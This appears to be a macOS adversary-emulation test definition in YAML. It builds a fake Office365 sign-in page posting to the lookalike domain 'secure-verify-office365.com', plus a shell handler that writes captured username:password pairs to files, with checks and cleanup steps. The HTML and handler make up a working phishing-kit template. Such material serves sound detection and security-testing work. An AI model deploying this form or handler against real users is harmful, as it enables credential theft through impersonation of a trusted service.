id: '8c3d1e5f-2b9a-4c7d-6f8e-3a1b5c9d2e4f'
name: 'Credential Harvesting Form Setup'
api_version: '2.0'
platform: darwin
description: |
  Demonstrates credential harvesting form setup by creating a fake login form 
  that mimics a legitimate company portal. Simulates HTML form creation and 
  credential capture mechanisms.

arguments:
  target_service:
    description: 'Service being impersonated (e.g., Office365, Gmail)'
    type: 'string'
    default: 'Office365'
  form_domain:
    description: 'Domain hosting the fake form'
    type: 'string'
    default: 'secure-verify-office365.com'
  harvest_endpoint:
    description: 'Endpoint URL for credential submission'
    type: 'string'
    default: 'https://secure-verify-office365.com/auth/verify'

steps:
  - name: 'Create credential harvesting form'
    type: 'atomic'
    command: |
      mkdir -p /tmp/phishing_forms
      cat > /tmp/phishing_forms/login.html << 'HTMLEOF'
      <!DOCTYPE html>
      <html>
      <head>
        <title>{{ target_service }} - Sign In</title>
        <style>
          body { font-family: Arial, sans-serif; background: #f5f5f5; }
          .login-container { max-width: 400px; margin: 100px auto; background: white; padding: 30px; border-radius: 5px; }
          input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ddd; }
          button { width: 100%; padding: 10px; background: #0078d4; color: white; border: none; cursor: pointer; }
        </style>
      </head>
      <body>
        <div class="login-container">
          <h2>{{ target_service }} Sign In</h2>
          <form action="{{ harvest_endpoint }}" method="POST">
            <input type="email" name="username" placeholder="Email or phone" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Sign In</button>
          </form>
        </div>
      </body>
      </html>
      HTMLEOF
      echo "Created credential harvesting form"
  
  - name: 'Create form submission handler'
    type: 'atomic'
    command: |
      cat > /tmp/phishing_forms/capture_credentials.sh << 'SCRIPTEOF'
      #!/bin/bash
      # Simulated credential capture handler
      username=$1
      password=$2
      timestamp=$(date +%Y%m%d_%H%M%S)
      
      mkdir -p /tmp/harvested_credentials
      echo "$username:$password" >> /tmp/harvested_credentials/captured_${timestamp}.txt
      echo "Credentials captured: $username"
      SCRIPTEOF
      chmod +x /tmp/phishing_forms/capture_credentials.sh
      echo "Created form submission handler"
  
  - name: 'Log form setup'
    type: 'atomic'
    command: |
      mkdir -p /tmp/harvest_logs
      timestamp=$(date +%Y%m%d_%H%M%S)
      cat > /tmp/harvest_logs/form_setup_${timestamp}.log << 'LOGEOF'
      Credential Harvesting Form Created
      ===================================
      Target Service: {{ target_service }}
      Form Domain: {{ form_domain }}
      Submission Endpoint: {{ harvest_endpoint }}
      Form Type: Fake Login Portal
      Status: Active
      LOGEOF
      echo "Form setup logged"

checks:
  - name: 'Verify HTML form created'
    type: 'atomic'
    command: 'test -f /tmp/phishing_forms/login.html && echo "PASS: Login form created"'
  
  - name: 'Verify form contains target service name'
    type: 'atomic'
    command: 'grep -q "{{ target_service }}" /tmp/phishing_forms/login.html && echo "PASS: Form impersonates target service"'
  
  - name: 'Verify submission endpoint configured'
    type: 'atomic'
    command: 'grep -q "{{ harvest_endpoint }}" /tmp/phishing_forms/login.html && echo "PASS: Submission endpoint configured"'

tests:
  dry_run: true

cleanup:
  - name: 'Remove phishing forms'
    type: 'atomic'
    command: 'rm -rf /tmp/phishing_forms'
  
  - name: 'Remove harvested credentials'
    type: 'atomic'
    command: 'rm -rf /tmp/harvested_credentials'
  
  - name: 'Remove harvest logs'
    type: 'atomic'
    command: 'rm -rf /tmp/harvest_logs'
